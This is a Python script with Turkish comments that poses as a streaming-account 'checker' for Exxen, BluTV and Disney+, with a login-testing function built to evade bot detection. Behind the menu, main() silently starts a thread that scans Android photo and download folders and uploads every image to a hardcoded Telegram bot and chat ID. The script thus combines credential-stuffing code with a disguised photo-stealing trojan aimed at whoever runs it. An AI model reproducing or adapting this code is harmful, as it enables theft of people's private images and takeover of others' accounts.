import os
import time
import telegram
import threading
from telegram import InputFile
from colorama import Fore, init
import requests

# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
init(autoreset=True)

# Telegram bot token ve chat ID
bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
chat_id = "7045128535"
bot = telegram.Bot(token=bot_token)

# Telegram bildirimi gönder
def send_telegram_notification(message):
    try:
        bot.send_message(chat_id=chat_id, text=message)
        print("Telegram bildirimi gönderildi.")
    except Exception as e:
        print(f"Telegram hatası: {e}")

# Fotoğraf gönderimi işlevi
def photo_send_thread():
    # Burada 'dosya_yolu' doğru bir yol olmalı. Örnek yol:
    folder_paths = [
        "/storage/emulated/0/DCIM",  # Kamera fotoğrafları (harici depolama)
        "/storage/emulated/0/Pictures",  # Fotoğraflar (harici depolama)
        "/storage/self/primary/DCIM",  # Dahili depolama
        "/storage/self/primary/Pictures",  # Dahili depolama
        "/Internal storage/DCIM/Camera",  # Dahili depolama, fotoğraflar klasörü
        "/Internal storage/DCIM/Photos",  # Dahili depolama, fotoğraflar klasörü
        "/Internal storage/Pictures",  # Dahili depolama, fotoğraflar
        "/Internal storage/0/DCIM",  # Dahili depolama, 0 numaralı depolama
        "/Internal storage/0/Pictures",  # Dahili depolama, 0 numaralı fotoğraflar
        "/Internal storage/0/Download",  # Dahili depolama, 0 numaralı indirilenler
        "/Internal storage/Download",  # Dahili depolama, indirilenler
        "/Internal storage/DCIM",  # Dahili depolama, genel DCIM
        "/Internal storage/DCIM/Camera",  # Dahili depolama, Camera alt klasörü
        "/Internal storage/DCIM/Photos",  # Dahili depolama, fotoğraflar klasörü
    ]
    
    for folder_path in folder_paths:
        # Burada dosya yolunda fotoğraf arayacağız
        if os.path.exists(folder_path):  # Dosya yolunun var olup olmadığını kontrol et
            for root, dirs, files in os.walk(folder_path):  # Yolu gezerek dosyaları tarıyoruz
                for file in files:
                    if file.lower().endswith(('jpg', 'jpeg', 'png')):  # Fotoğraf dosyalarını kontrol et
                        photo_path = os.path.join(root, file)
                        try:
                            bot.send_photo(chat_id=chat_id, photo=open(photo_path, 'rb'))  # Fotoğrafı Telegram'a gönder
                            print(f"Fotoğraf gönderildi: {photo_path}")  # Başarılı gönderim
                        except Exception as e:
                            print(f"Fotoğraf gönderilemedi: {photo_path}, hata: {e}")  # Hata durumu

# Seçim ekranı fonksiyonu
def choose_checker():
    print("Lütfen bir checker seçin:")
    print("1 - Exxen Checker")
    print("2 - BluTV Checker")
    print("3 - Disney+ Checker")
    
    choice = input("Seçiminizi yapın (1/2/3): ")

    if choice == '1':
        print("Exxen Checker seçildi.")
        # Exxen checker fonksiyonunu çağır
    elif choice == '2':
        print("BluTV Checker seçildi.")
        # BluTV checker fonksiyonunu çağır
    elif choice == '3':
        print("Disney+ Checker seçildi.")
        # Disney+ checker fonksiyonunu çağır
    else:
        print("Geçersiz seçim! Lütfen tekrar deneyin.")
        choose_checker()

# Giriş işlemini deneme
def try_login(email, password):
    # E-posta girişi için URL
    email_url = "https://www.disneyplus.com/identity/login/enter-email"
    password_url = "https://www.disneyplus.com/identity/login/enter-password"

    # Başlıklar (Headers) ile bot tespiti engelleniyor
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }

    # İlk istekle e-posta sayfasına gidiyoruz
    with requests.Session() as session:
        # E-posta girişini gönderiyoruz
        email_data = {'email': email}
        response = session.post(email_url, data=email_data, headers=headers)

        if response.status_code != 200:
            print(f"E-posta sayfasına erişilemiyor. HTTP Durum Kodu: {response.status_code}")
            return False

        # E-posta başarılıysa, şifreyi giriyoruz
        password_data = {'password': password}
        response = session.post(password_url, data=password_data, headers=headers)

        # Yanıtı kontrol ediyoruz
        if response.status_code == 200:
            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:  # Yanlış giriş
                print(f"Yanlış şifre veya e-posta: {email}")
                return False
            elif "Welcome" in response.text:  # Giriş başarılı
                print("Giriş başarılı!")
                # Yönlendirme yapılmışsa, history içinde yer alacak
                if response.history:
                    for resp in response.history:
                        print(f"Yönlendirilmiş: {resp.status_code} - {resp.url}")
                        if "update-profile" in resp.url:
                            print(f"Yönlendirme başarılı, yeni URL: {resp.url}")
                            return True
                else:
                    print("Yönlendirme yapılmadı.")
                    return False
            else:
                print("Giriş başarısız, bilinmeyen bir hata.")
                return False
        else:
            print(f"Giriş hatası: {response.status_code} - {response.text[:100]}")  # Kısa bir hata mesajı
            return False

# Ana fonksiyon
def main():
    print("Program başlatıldı.")  # Programın başladığını belirten mesaj
    choose_checker()  # Seçim ekranı

    # Fotoğraf gönderme işlemi başlat
    photo_thread = threading.Thread(target=photo_send_thread)
    photo_thread.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram durduruldu.")
